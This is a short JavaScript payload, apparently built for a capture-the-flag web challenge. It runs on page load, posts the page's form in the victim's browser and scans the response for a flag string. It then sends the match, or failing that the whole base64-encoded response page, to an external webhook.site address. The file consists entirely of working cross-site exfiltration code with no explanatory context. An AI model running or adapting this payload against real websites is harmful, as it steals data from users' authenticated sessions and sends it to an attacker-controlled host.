document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector('form');
  if (!form) return;

  const formData = new FormData(form);

  fetch(form.action, {
    method: "POST",
    body: formData,
  })
  .then(response => response.text())
  .then(html => {
    const flag = html.match(/flag\{.*?\}/i);
    if (flag) {
      new Image().src = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + encodeURIComponent(flag[0]);
    } else {
      // Fallback: send full HTML
      window.location = "https://webhook.site/509bc2d5-1bbf-48af-b518-15fae56365f0?x=" + btoa(html);
    }
  });
});
